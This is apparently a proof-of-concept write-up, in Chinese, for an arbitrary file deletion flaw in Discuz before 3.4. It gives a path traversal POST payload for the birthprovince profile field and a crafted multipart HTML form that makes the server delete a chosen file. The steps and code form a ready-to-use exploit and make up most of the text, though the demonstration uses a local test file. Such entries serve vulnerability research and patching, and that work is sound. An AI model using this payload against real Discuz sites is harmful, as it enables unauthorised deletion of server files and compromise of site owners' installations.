# Discuz_＜3.4_birthprovince_前台任意文件删除

## Affected Version

Discuz < 3.4 版本

需要会员身份登陆站点。

下载地址： 链接: https://pan.baidu.com/s/1hsOoSte 密码: nvjj


## PoC


测试：

1. 为了不破坏原有程序，在根目录下新建 1.txt 作为演示。

![1](1.png)

2. 登陆前台，访问 http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&ac=profile&op=base

先发起一个POST请求 

    birthprovince=../../../1.txt&profilesubmit=1&formhash=18a19dce
    // formhash 需要右键查看源代码得到

成功后，个人信息已经被修改成如下:

![changed](changed.png)

3. 最后，本地提交POST表单删除文件 1.txt

表单内容：

    <form action="http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&ac=profile&op=base" method="POST" enctype="multipart/form-data">
    <input type="file" name="birthprovince" id="file" />
    <input type="text" name="formhash" value="18a19dce"/></p>
    <input type="text" name="profilesubmit" value="1"/></p>
    <input type="submit" value="Submit" />
    </from>

随便上传一个图片提交会导致删除 birthprovince 设置的文件名称，在这里是 1.txt。

## References

1. http://www.freebuf.com/vuls/149904.html
2. http://www.freebuf.com/articles/system/149810.html
